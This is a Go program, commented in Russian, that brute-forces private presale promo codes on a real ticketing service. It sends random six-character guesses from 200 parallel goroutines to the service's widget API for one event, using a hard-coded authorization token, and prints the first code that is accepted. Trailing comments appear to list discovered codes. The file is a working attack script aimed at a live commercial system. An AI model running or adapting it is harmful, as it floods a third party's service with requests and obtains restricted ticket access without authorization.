package main

import (
	"encoding/json"
	"fmt"
	"github.com/google/uuid"
	"io"
	"log"
	"net/http"
	"strings"
	"sync/atomic"
	"time"
)


// T – структура для записи и проверки статуса промокода
type T struct {
	ClosedSales struct {
		Status string `json:"status"`
		Error  string `json:"error"`
	} `json:"closed_sales"`
}

func main() {
	// создаем канал из строки, будем записывать успешный промокод
	ch := make(chan string)
	// n – считаем количество проверенных промокодов
	var n int64

	// запуск 200 горутин
	for i := 0; i < 200; i++ {
		go func() {
			client := http.Client{}

			for {
				// генерация строки из 6 рандомных символов
				promo := uuid.NewString()[:6]
				// Увеличиваем n с помощью пакета atomic для защиты от race condition
				atomic.AddInt64(&n, 1)
				// печать: номер промокода и сам промокод
				log.Println(n, promo)
				// формируем запрос [метод, url, body]
				req, err := http.NewRequest("POST", "https://ticketscloud.com/v1/services/widget", strings.NewReader(`{"event":"618300997bf9cf9ab95b1418","promokey":"private-`+promo+`-presale"}`))
				if err != nil {
					log.Fatalln(err)
				}
				// добавляем необходимые заголовки для запроса
				req.Header.Set("content-type", "application/json")
				req.Header.Set("authorization", "token eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImlzcyI6InRpY2tldHNjbG91ZC5ydSJ9.eyJwIjoiNjEwYWZkNTU3NTA1MWQ5NGNmZDM3MjM1In0.canXkDuGU4Wbam1OJ8n0hpjyc4RhFLXFDc-9w7cBej4")

				// запрос
				resp, err := client.Do(req)
				if err != nil {
					log.Fatalln(err)
				}
				// объект для записи body
				lol := &T{}
				// считываем body[resp]
				respByte, err := io.ReadAll(resp.Body)
				if err != nil {
					log.Fatalln(err)
				}
				// init lol
				if err = json.Unmarshal(respByte, lol); err != nil {
					log.Fatalln(err)
				}
				// если нет ошибки, а это значит – корректный промокод
				if lol.ClosedSales.Status != "error" {
					// записываем в канал
					ch <- promo
				}
			}
		}()
	}
	select {
	// ожидаем пока какой-нибудь воркер не запишет в канал
	case suc := <-ch:
		fmt.Println(suc)
	// а тут ожидаем 5 минут и выходим из программы
	case <-time.After(5 * time.Minute):
		fmt.Println("timeout")
	}
}
//8e6f0a
//8df2de
